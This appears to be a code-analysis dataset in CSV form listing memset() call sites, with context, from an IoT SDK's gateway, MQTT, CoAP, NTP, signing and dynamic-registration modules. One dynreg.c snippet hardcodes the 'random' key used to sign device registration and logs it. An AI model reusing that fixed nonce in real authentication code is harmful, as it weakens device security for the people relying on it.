            memset(&lite_item_payload, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_PAYLOAD, strlen(LINKKIT_GATEWAY_LEGACY_KEY_PAYLOAD),
                                         &lite_item_payload);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(params, 0, lite_item_payload.value_length + 1);",120,1,"                return;
            }
            memset(params, 0, lite_item_payload.value_length + 1);
            memcpy(params, lite_item_payload.value, lite_item_payload.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_timeout, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Timeout */
            memset(&lite_item_timeout, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_TIME, strlen(LINKKIT_GATEWAY_LEGACY_KEY_TIME),
                                         &lite_item_timeout);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_serviceid, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Serviceid */
            memset(&lite_item_serviceid, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_SERVICEID, strlen(LINKKIT_GATEWAY_LEGACY_KEY_SERVICEID),
                                         &lite_item_serviceid);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_paylaod, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Payload */
            memset(&lite_item_paylaod, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_PAYLOAD, strlen(LINKKIT_GATEWAY_LEGACY_KEY_PAYLOAD),
                                         &lite_item_paylaod);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(identifier, 0, lite_item_serviceid.value_length + 1);",120,1,"                return;
            }
            memset(identifier, 0, lite_item_serviceid.value_length + 1);
            memcpy(identifier, lite_item_serviceid.value, lite_item_serviceid.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(input, 0, lite_item_paylaod.value_length + 1);",120,1,"                return;
            }
            memset(input, 0, lite_item_paylaod.value_length + 1);
            memcpy(input, lite_item_paylaod.value, lite_item_paylaod.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(output, 0, linkkit_gateway_ctx->init_params.maxMsgSize + 1);",120,1,"                return;
            }
            memset(output, 0, linkkit_gateway_ctx->init_params.maxMsgSize + 1);

            _linkkit_gateway_upstream_mutex_lock();
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_rawdata, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Raw Data */
            memset(&lite_item_rawdata, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_PAYLOAD, strlen(LINKKIT_GATEWAY_LEGACY_KEY_PAYLOAD),
                                         &lite_item_rawdata);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_eventid, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Property ID */
            memset(&lite_item_eventid, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_EVENTID, strlen(LINKKIT_GATEWAY_LEGACY_KEY_EVENTID),
                                         &lite_item_eventid);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(eventid, 0, lite_item_eventid.value_length + 1);",120,1,"                return;
            }
            memset(eventid, 0, lite_item_eventid.value_length + 1);
            memcpy(eventid, lite_item_eventid.value, lite_item_eventid.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&lite_item_version, 0, sizeof(lite_cjson_t));",120,1,"
            /* Parse Version */
            memset(&lite_item_version, 0, sizeof(lite_cjson_t));
            res = lite_cjson_object_item(&lite, LINKKIT_GATEWAY_LEGACY_KEY_VERSION, strlen(LINKKIT_GATEWAY_LEGACY_KEY_VERSION),
                                         &lite_item_version);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(version, 0, lite_item_version.value_length + 1);",120,1,"                return;
            }
            memset(version, 0, lite_item_version.value_length + 1);
            memcpy(version, lite_item_version.value, lite_item_version.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&dm_init_params, 0, sizeof(iotx_dm_init_params_t));",120,1,"
    /* Initialize Device Manager */
    memset(&dm_init_params, 0, sizeof(iotx_dm_init_params_t));
    dm_init_params.secret_type = IOTX_DM_DEVICE_SECRET_DEVICE;
    dm_init_params.domain_type = IOTX_DM_CLOUD_DOMAIN_SHANGHAI;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(&linkkit_gateway_ctx->init_params, 0, sizeof(linkkit_params_t));",120,1,"    linkkit_gateway_ctx->mutex = NULL;
    linkkit_gateway_ctx->upstream_mutex = NULL;
    memset(&linkkit_gateway_ctx->init_params, 0, sizeof(linkkit_params_t));
    linkkit_gateway_ctx->dispatch_thread = NULL;
    linkkit_gateway_ctx->fota_callback = NULL;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_gateway.c,"memset(devinfo, 0, sizeof(linkkit_devinfo_t));",120,1,"
    _linkkit_gateway_mutex_lock();
    memset(devinfo, 0, sizeof(linkkit_devinfo_t));
    res = iotx_dm_deprecated_legacy_get_pkdn_ptr_by_devid(devid, &(devinfo->productKey), &(devinfo->deviceName));
    if (res != SUCCESS_RETURN) {
"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(insert_node, 0, sizeof(iotx_service_ctx_node_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(insert_node, 0, sizeof(iotx_service_ctx_node_t));

    infra_str2int(msgid, &insert_node->msgid);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(search_node, 0, sizeof(iotx_linkkit_upstream_sync_callback_node_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(search_node, 0, sizeof(iotx_linkkit_upstream_sync_callback_node_t));
    search_node->msgid = msgid;
    search_node->semaphore = semaphore;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(raw_data, 0, raw_data_len);",120,1,"                return;
            }
            memset(raw_data, 0, raw_data_len);
            LITE_hexstr_convert(lite_item_payload.value, lite_item_payload.value_length, raw_data, raw_data_len);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(request, 0, lite_item_payload.value_length + 1);",120,1,"                return;
            }
            memset(request, 0, lite_item_payload.value_length + 1);
            memcpy(request, lite_item_payload.value, lite_item_payload.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(property_payload, 0, lite_item_payload.value_length + 1);",120,1,"                return;
            }
            memset(property_payload, 0, lite_item_payload.value_length + 1);
            memcpy(property_payload, lite_item_payload.value, lite_item_payload.value_length);
#ifdef LOG_REPORT_TO_CLOUD
"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(&lite_item_data, 0, sizeof(lite_cjson_t));",120,1,"            lite_cjson_t lite_item_data;

            memset(&lite_item_data, 0, sizeof(lite_cjson_t));
            dm_utils_json_object_item(&lite, IOTX_LINKKIT_KEY_DATA, strlen(IOTX_LINKKIT_KEY_DATA), cJSON_Invalid,
                                      &lite_item_data);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(property_data, 0, lite_item_data.value_length + 1);",120,1,"                return;
            }
            memset(property_data, 0, lite_item_data.value_length + 1);
            memcpy(property_data, lite_item_data.value, lite_item_data.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(user_payload, 0, lite_item_payload.value_length + 1);",120,1,"                    return;
                }
                memset(user_payload, 0, lite_item_payload.value_length + 1);
                memcpy(user_payload, lite_item_payload.value, lite_item_payload.value_length);
                user_payload_length = lite_item_payload.value_length;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(user_eventid, 0, lite_item_eventid.value_length + 1);",120,1,"                return;
            }
            memset(user_eventid, 0, lite_item_eventid.value_length + 1);
            memcpy(user_eventid, lite_item_eventid.value, lite_item_eventid.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(utc_payload, 0, lite_item_utc.value_length + 1);",120,1,"                return;
            }
            memset(utc_payload, 0, lite_item_utc.value_length + 1);
            memcpy(utc_payload, lite_item_utc.value, lite_item_utc.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(rrpc_request, 0, lite_item_payload.value_length + 1);",120,1,"                return;
            }
            memset(rrpc_request, 0, lite_item_payload.value_length + 1);
            memcpy(rrpc_request, lite_item_payload.value, lite_item_payload.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(err_data, 0, lite_item_data.value_length + 1);",120,1,"            }

            memset(err_data, 0, lite_item_data.value_length + 1);
            memcpy(err_data, lite_item_data.value, lite_item_data.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(err_detail, 0, lite_item_message.value_length + 1);",120,1,"            }

            memset(err_detail, 0, lite_item_message.value_length + 1);
            memcpy(err_detail, lite_item_message.value, lite_item_message.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(topo_list, 0, lite_item_topo.value_length + 1);",120,1,"                return;
            }
            memset(topo_list, 0, lite_item_topo.value_length + 1);
            memcpy(topo_list, lite_item_topo.value, lite_item_topo.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(product_key, 0, lite_item_pk.value_length + 1);",120,1,"                    return;
                }
                memset(product_key, 0, lite_item_pk.value_length + 1);
                memcpy(product_key, lite_item_pk.value, lite_item_pk.value_length);
            }
"
2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_linkkit.c,"memset(ctx, 0, sizeof(iotx_linkkit_ctx_t));",120,1,"    amp_mutex_destroy(ctx->service_list_mutex);
#endif
    memset(ctx, 0, sizeof(iotx_linkkit_ctx_t));

#if (defined(AWSS_SUPPORT_ZEROCONFIG) && !defined(AWSS_DISABLE_REGISTRAR))
"
2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,"memset(g_ntp_time, 0, sizeof(g_ntp_time));",120,1,"    }

    memset(g_ntp_time, 0, sizeof(g_ntp_time));
    log_debug(""[ntp]"", ""ntp reply len:%u, payload:%s\r\n"", payload_len, payload);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,"memset(topic, 0, topic_len + 1);",120,1,"            goto NTP_REQ_ERR;
        }
        memset(topic, 0, topic_len + 1);

        amp_snprintf(topic, topic_len, TOPIC_NTP_REPLY, pk, dn);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,"memset(packet, 0, packet_len + 1);",120,1,"        goto NTP_REQ_ERR;
    }
    memset(packet, 0, packet_len + 1);

    g_ntp_reply_cb = ntp_reply;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_solo.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_solo.c,"memset(search_node, 0, sizeof(linkkit_solo_upstream_callback_node_t));",120,1,"        return FAIL_RETURN;
    }
    memset(search_node, 0, sizeof(linkkit_solo_upstream_callback_node_t));

    search_node->msgid = msgid;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_solo.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_solo.c,"memset(service, 0, lite_item_serviceid.value_length + 1);",120,1,"                return;
            }
            memset(service, 0, lite_item_serviceid.value_length + 1);
            memcpy(service, lite_item_serviceid.value, lite_item_serviceid.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\impl_solo.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_solo.c,"memset(propertyid, 0, lite_item_propertyid.value_length + 1);",120,1,"                return;
            }
            memset(propertyid, 0, lite_item_propertyid.value_length + 1);
            memcpy(propertyid, lite_item_propertyid.value, lite_item_propertyid.value_length);

"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,"memset(coap_config, 0, sizeof(iotx_coap_config_t));",120,1,"        goto failed;
    }
    memset(coap_config, 0, sizeof(iotx_coap_config_t));
    deviceinfo = (iotx_coap_device_info_t *)cm_malloc(sizeof(iotx_coap_device_info_t));
    if (deviceinfo == NULL) {
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,"memset(deviceinfo, 0, sizeof(iotx_coap_device_info_t));",120,1,"    _coap_conncection->open_params = coap_config;

    memset(deviceinfo, 0, sizeof(iotx_coap_device_info_t));

    iotx_set_devinfo(deviceinfo);
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,"memset(p_devinfo, 0x00, sizeof(iotx_coap_device_info_t));",120,1,"    }

    memset(p_devinfo, 0x00, sizeof(iotx_coap_device_info_t));

    /**< get device info*/
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,"memset(topic, 0, topic_len);",120,1,"                continue;
            }
            memset(topic, 0, topic_len);
            strncpy(topic, node->topic, topic_len);
            list_del(&node->linked_list);
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,"memset(&message, 0, sizeof(iotx_message_t));",120,1,"        qos = _get_coap_qos(ext->ack_type);
    }
    memset(&message, 0, sizeof(iotx_message_t));

    message.p_payload = (unsigned char *)payload;
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,"memset(node, 0, sizeof(coap_response_node_t));",120,1,"            return -1;
        }
        memset(node, 0, sizeof(coap_response_node_t));
        topic_len = strlen(topic) + 1;
        node->topic = (char *)cm_malloc(topic_len);
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,"memset(node->topic, 0, topic_len);",120,1,"        }

        memset(node->topic, 0, topic_len);
        strncpy(node->topic, topic, topic_len);

"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,"memset(_mqtt_conncection, 0, sizeof(iotx_cm_connection_t));",120,1,"        goto failed;
    }
    memset(_mqtt_conncection, 0, sizeof(iotx_cm_connection_t));

    mqtt_param = (iotx_mqtt_param_t *)cm_malloc(sizeof(iotx_mqtt_param_t));
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,"memset(mqtt_param, 0, sizeof(iotx_mqtt_param_t));",120,1,"        goto failed;
    }
    memset(mqtt_param, 0, sizeof(iotx_mqtt_param_t));

    mqtt_param->request_timeout_ms = params->request_timeout_ms;
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,"memset(topic, 0, topic_info->topic_len + 1);",120,1,"                return;
            }
            memset(topic, 0, topic_info->topic_len + 1);
            memcpy(topic, topic_info->ptopic, topic_info->topic_len);

"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(clientid_string, 0, DEV_SIGN_CLIENT_ID_MAXLEN);",120,1,"    }

    memset(clientid_string, 0, DEV_SIGN_CLIENT_ID_MAXLEN);
    if (strlen(device_id) + 1 >= DEV_SIGN_CLIENT_ID_MAXLEN) {
        return STATE_MQTT_SIGN_CLIENTID_BUF_SHORT;
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signsource, 0, DEV_SIGN_SOURCE_MAXLEN);",120,1,"    }

    memset(signsource, 0, DEV_SIGN_SOURCE_MAXLEN);
    memcpy(signsource, ""clientId"", strlen(""clientId""));
    memcpy(signsource + strlen(signsource), device_id, strlen(device_id));
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signout, 0, sizeof(iotx_sign_mqtt_t));",120,1,"    }

    memset(signout, 0, sizeof(iotx_sign_mqtt_t));

    memcpy(device_id, meta->product_key, strlen(meta->product_key));
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signout->password, 0, DEV_SIGN_PASSWORD_MAXLEN);",120,1,"
    /* setup password */
    memset(signout->password, 0, DEV_SIGN_PASSWORD_MAXLEN);
    res = _iotx_generate_sign_string(device_id, meta->device_name, meta->product_key, meta->device_secret,
                                     signout->password);
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signout->hostname, 0, DEV_SIGN_HOSTNAME_MAXLEN);",120,1,"        }

        memset(signout->hostname, 0, DEV_SIGN_HOSTNAME_MAXLEN);
        memcpy(signout->hostname, g_infra_mqtt_domain[region], strlen(g_infra_mqtt_domain[region]));
    } else {
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signout->username, 0, DEV_SIGN_USERNAME_MAXLEN);",120,1,"        return STATE_MQTT_SIGN_USERNAME_BUF_SHORT;
    }
    memset(signout->username, 0, DEV_SIGN_USERNAME_MAXLEN);
    memcpy(signout->username, meta->device_name, strlen(meta->device_name));
    memcpy(signout->username + strlen(signout->username), ""&"", strlen(""&""));
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(random, 0, DYNREG_RANDOM_KEY_LENGTH + 1);",120,1,"
    /* Start Dynamic Register */
    memset(random, 0, DYNREG_RANDOM_KEY_LENGTH + 1);
    memcpy(random, ""8Ygb7ULYh53B6OA"", strlen(""8Ygb7ULYh53B6OA""));
    dynreg_info(""Random Key: %s"", random);
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(url, 0, url_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(url, 0, url_len);
    amp_snprintf(url, url_len, url_format, domain);

"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(&response, 0, sizeof(dynreg_http_response_t));",120,1,"    amp_snprintf(url, url_len, url_format, domain);

    memset(&response, 0, sizeof(dynreg_http_response_t));
    response.payload = response_payload;
    response.payload_len = HTTP_RESPONSE_PAYLOAD_LEN;
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(dynamic_register_request, 0, dynamic_register_request_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(dynamic_register_request, 0, dynamic_register_request_len);
    amp_snprintf(dynamic_register_request, dynamic_register_request_len, dynamic_register_format,
                 meta->product_key, meta->device_name, random, sign, DYNREG_SIGN_METHOD_HMACSHA256);
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(dynamic_register_response, 0, HTTP_RESPONSE_PAYLOAD_LEN);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(dynamic_register_response, 0, HTTP_RESPONSE_PAYLOAD_LEN);

    /* Send Http Request For Getting Device Secret */
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(signsource, 0, signsource_len);",120,1,"        return STATE_MQTT_SIGN_SOURCE_BUF_SHORT;
    }
    memset(signsource, 0, signsource_len);
    memcpy(signsource, ""deviceName"", strlen(""deviceName""));
    memcpy(signsource + strlen(signsource), meta_info->device_name, strlen(meta_info->device_name));
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(signout->clientid, 0, clientid_len);",120,1,"        return ERROR_DEV_SIGN_CLIENT_ID_TOO_SHORT;
    }
    memset(signout->clientid, 0, clientid_len);
    memcpy(signout->clientid, meta_info->product_key, strlen(meta_info->product_key));
    memcpy(signout->clientid + strlen(signout->clientid), ""."", strlen("".""));
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(&signout, 0, sizeof(iotx_sign_mqtt_t));",120,1,"    char device_secret[IOTX_DEVICE_SECRET_LEN + 1] = {0};

    memset(&signout, 0, sizeof(iotx_sign_mqtt_t));

    /* setup hostname */
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(signout.hostname, 0, DEV_SIGN_HOSTNAME_MAXLEN);",120,1,"        }

        memset(signout.hostname, 0, DEV_SIGN_HOSTNAME_MAXLEN);
        memcpy(signout.hostname, g_infra_mqtt_domain[region], strlen(g_infra_mqtt_domain[region]));
    } else {
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(signout.username, 0, DEV_SIGN_USERNAME_MAXLEN);",120,1,"        return STATE_MQTT_SIGN_USERNAME_BUF_SHORT;
    }
    memset(signout.username, 0, DEV_SIGN_USERNAME_MAXLEN);
    memcpy(signout.username, meta->device_name, strlen(meta->device_name));
    memcpy(signout.username + strlen(signout.username), ""&"", strlen(""&""));
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(&mqtt_params, 0, sizeof(iotx_mqtt_param_t));",120,1,"    }

    memset(&mqtt_params, 0, sizeof(iotx_mqtt_param_t));
    mqtt_params.host = signout.hostname;
    mqtt_params.port = signout.port;
"
2021\haas-mini-program\components\linkkit\infra\infra_activation.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_activation.c,"memset(msg, 0, msg_len);",120,1,"        return FAIL_RETURN;
    }
    memset(msg, 0, msg_len);

    /* devinfo update message */
"
2021\haas-mini-program\components\linkkit\infra\infra_aes.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_aes.c,"memset( ctx, 0, sizeof( infra_aes_context ) );",120,1,"void infra_aes_init( infra_aes_context *ctx )
{
    memset( ctx, 0, sizeof( infra_aes_context ) );
}

"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&current_item, 0, sizeof(lite_cjson_t));",120,1,"    /* loop through the comma separated array elements */
    do {
        memset(&current_item, 0, sizeof(lite_cjson_t));

        /* parse next value */
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&current_item_key, 0, sizeof(lite_cjson_t));",120,1,"    /* loop through the comma separated array elements */
    do {
        memset(&current_item_key, 0, sizeof(lite_cjson_t));
        memset(&current_item_value, 0, sizeof(lite_cjson_t));

"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&current_item_value, 0, sizeof(lite_cjson_t));",120,1,"    do {
        memset(&current_item_key, 0, sizeof(lite_cjson_t));
        memset(&current_item_value, 0, sizeof(lite_cjson_t));

        /* parse the name of the child */
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&buffer, 0, sizeof(parse_buffer));",120,1,"    }

    memset(&buffer, 0, sizeof(parse_buffer));
    buffer.content = (const unsigned char *)src;
    buffer.length = src_len;
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&lite_prev, 0, sizeof(lite_cjson_t));",120,1,"
    memcpy(&lite_iter, lite, sizeof(lite_cjson_t));
    memset(&lite_prev, 0, sizeof(lite_cjson_t));

    do {
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&lite_next, 0, sizeof(lite_cjson_t));",120,1,"        if ((delim = strchr(key_iter, '.')) != NULL) {
            /* printf(""delim exist,delim : %s\n"",delim); */
            memset(&lite_next, 0, sizeof(lite_cjson_t));
            partial_key_len = array_key_len = array_index = 0;
            key_iter_len = (int)(delim - key_iter);
"
